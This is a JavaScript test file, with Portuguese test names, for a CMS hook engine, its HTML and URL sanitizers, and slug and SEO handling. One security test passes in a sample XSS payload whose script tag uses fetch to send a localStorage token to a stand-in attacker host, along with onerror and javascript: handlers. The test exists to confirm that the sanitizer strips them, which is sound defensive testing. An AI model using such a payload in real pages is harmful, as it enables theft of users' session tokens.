import { describe, it, expect, beforeEach } from 'vitest';
import { HookEngine } from '../src/core/HookEngine.js';
import { sanitizeHtml, isSafeApiUrl, sanitizeMetaObject } from '../src/core/security.js';
import { validateAndNormalizePost, slugify } from '../src/core/validator.js';
import { ApiClient } from '../src/core/apiClient.js';
import { SmartSeoPlugin } from '../src/plugins/smart-seo/index.js';

describe('1. HookEngine (Sistema de Plugins Estilo WordPress)', () => {
  let engine;

  beforeEach(() => {
    engine = new HookEngine();
  });

  it('deve executar filters respeitando a ordem de prioridade (menor primeiro)', async () => {
    engine.addFilter('texto', (val) => `${val} -> P20`, 20, 'plugin-b');
    engine.addFilter('texto', (val) => `${val} -> P5`, 5, 'plugin-a');
    engine.addFilter('texto', (val) => `${val} -> P10`, 10, 'plugin-c');

    const resultado = await engine.applyFilters('texto', 'Inicio');
    expect(resultado).toBe('Inicio -> P5 -> P10 -> P20');
  });

  it('deve preservar o dado original se um plugin esquecer de dar return (undefined) ou quebrar', async () => {
    engine.addFilter('post:title', (t) => `${t} [Editado]`, 10, 'plugin-ok');
    engine.addFilter('post:title', () => undefined, 15, 'plugin-esquecido');
    engine.addFilter(
      'post:title',
      () => {
        throw new Error('Falha catastrófica no plugin!');
      },
      20,
      'plugin-bugado'
    );

    const tituloFinal = await engine.applyFilters('post:title', 'Meu Artigo');
    expect(tituloFinal).toBe('Meu Artigo [Editado]');
    expect(engine.errors.length).toBe(1);
    expect(engine.errors[0].pluginId).toBe('plugin-bugado');
  });

  it('deve permitir remover os hooks de um plugin desativado em runtime', async () => {
    engine.addFilter('valor', (v) => v * 2, 10, 'plugin-temp');
    expect(await engine.applyFilters('valor', 5)).toBe(10);

    engine.removePluginHooks('plugin-temp');
    expect(await engine.applyFilters('valor', 5)).toBe(5);
  });
});

describe('2. Segurança (Sanitização XSS, Prototype Pollution e URLs)', () => {
  it('deve remover tags <script>, handlers onerror/onclick e links javascript:', () => {
    const htmlMalicioso = `
      <h1>Olá Mundo</h1>
      <script>fetch('https://hacker.com/roubar?token=' + localStorage.token)</script>
      <img src="x" onerror="alert('XSS')" />
      <a href="javascript:alert(1)" onclick="steal()">Clique aqui</a>
    `;
    const limpo = sanitizeHtml(htmlMalicioso);

    expect(limpo).toContain('<h1>Olá Mundo</h1>');
    expect(limpo).not.toContain('<script>');
    expect(limpo).not.toContain('onerror');
    expect(limpo).not.toContain('onclick');
    expect(limpo).not.toContain('javascript:');
  });

  it('deve validar apenas URLs de API seguras (HTTPS ou localhost)', () => {
    expect(isSafeApiUrl('https://minha-api.workers.dev')).toBe(true);
    expect(isSafeApiUrl('http://localhost:8787')).toBe(true);
    expect(isSafeApiUrl('http://127.0.0.1:8000')).toBe(true);
    expect(isSafeApiUrl('http://servidor-inseguro-remoto.com')).toBe(false);
    expect(isSafeApiUrl('javascript:alert(1)')).toBe(false);
  });

  it('deve bloquear payloads de meta gigantescos', () => {
    const metaGigante = { lixo: 'x'.repeat(70000) };
    expect(() => sanitizeMetaObject(metaGigante, 65536)).toThrow();
  });
});

describe('3. Validação, Normalização e Fluxo Integrado com Plugin Smart SEO', () => {
  it('deve normalizar acentos no slug e gerar ID ordenável', () => {
    expect(slugify('Atenção: Como Criar um CMS Rápido em 2026!')).toBe(
      'atencao-como-criar-um-cms-rapido-em-2026'
    );
  });

  it('deve salvar um post passando pelo plugin Smart SEO e sanitizar o HTML final', async () => {
    const { cms } = await import('../src/core/HookEngine.js');
    cms.removePluginHooks('smart-seo');
    SmartSeoPlugin.setup(cms);

    const client = new ApiClient();
    const postSalvo = await client.savePost({
      title: 'Lançamento do Nosso Edge CMS',
      content_html: '<p>Este é o conteúdo oficial do nosso novo sistema rápido.</p><script>evil()</script>',
      status: 'published'
    });

    expect(postSalvo.id).toMatch(/^pst_[0-9a-f]{12}_[0-9a-f]{10}$/);
    expect(postSalvo.slug).toBe('lancamento-do-nosso-edge-cms');
    expect(postSalvo.content_html).toBe('<p>Este é o conteúdo oficial do nosso novo sistema rápido.</p>');
    expect(postSalvo.meta.seo_title).toBe('Lançamento do Nosso Edge CMS | Edge CMS');
    expect(postSalvo.meta.seo_description).toContain('Este é o conteúdo oficial');
  });
});
